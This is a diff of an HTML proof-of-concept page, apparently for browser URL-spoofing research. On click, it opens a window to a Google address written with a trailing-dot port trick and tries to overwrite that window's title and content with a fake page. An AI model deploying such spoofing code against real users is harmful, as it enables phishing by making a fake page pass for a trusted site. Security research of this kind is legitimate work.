@@ -1,33 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Click Spoof Testcase - Modified from Code Audit Labs</title>
+  <title>Spoof Testcase - Click Version</title>
 </head>
 <body>
 
   <h3>
-    <a href="http://www.google.com" id="a" onclick="executeSpoof(); return false;">
-      Click Me 
+    <a href="javascript:void(0)" id="a" onclick="executeSpoof()">
+      <h1>Click Me</h1>
     </a>
   </h3>
   
-  <h3 id="note" style="display:none;">
+  <div id="note" style="display:none;">
     <img src="https://i.ibb.co.com/xS0bMW7S/image.png" alt="Obito Scene" style="max-width: 500px; height: auto;">
     <br>
-    I Am Not Google At All
-  </h3>
-
-</body>
+    <h1>I Am Not Google At All</h1>
+  </div>
 
 <script>
   function executeSpoof() {
-
-    try { stop(); } catch(e) {} 
     
+    var t = window.open('https://www.google.com:443.', 'spoof_window');
+
+    
+    setTimeout(function() {
+        try {
+            t.document.title = "Google";
+            t.document.body.innerHTML = "<h1>Fake Page - Vulnerability Research</h1>";
+        } catch(e) {
+            console.log("Cross-origin blocked, but spoof window opened.");
+        }
+    }, 100);
+
     document.title = 'Done';
     document.getElementById('a').style.display = 'none';
     document.getElementById('note').style.display = 'block';
-
   }
 </script>
+
+</body>
 </html>
